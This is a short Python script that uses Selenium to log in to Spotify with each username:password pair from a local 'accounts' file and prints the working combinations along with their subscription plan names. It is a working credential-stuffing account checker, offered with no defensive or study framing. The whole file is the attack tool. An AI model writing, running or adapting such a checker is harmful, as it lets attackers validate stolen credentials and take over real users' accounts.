from selenium import webdriver
import time
from bs4 import BeautifulSoup
from tqdm import tqdm

driver = webdriver.Chrome()


def check(user, password):
    """check if the combination works"""
    driver.get("https://accounts.spotify.com/en/login")
    user_elem = driver.find_element_by_id("login-username")
    password_elem = driver.find_element_by_id("login-password")
    button_elem = driver.find_element_by_class_name("btn-green")

    user_elem.clear()
    password_elem.clear()

    user_elem.send_keys(user)
    password_elem.send_keys(password)
    button_elem.click()

    time.sleep(2)

    driver.get("https://www.spotify.com/us/account/overview/")
    parse = BeautifulSoup(driver.page_source, 'html5lib')
    for h3 in parse.find_all('h3', {'class': "product-name"}):
        print('{}:{}:{}'.format(user, password, h3.get_text()))

    driver.delete_all_cookies()

with open('./accounts') as s:
    amount = len(s.readlines())
    s.seek(0)
    for line in tqdm(s, total=amount):
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())
    driver.delete_all_cookies()
    driver.close()
    driver.quit()
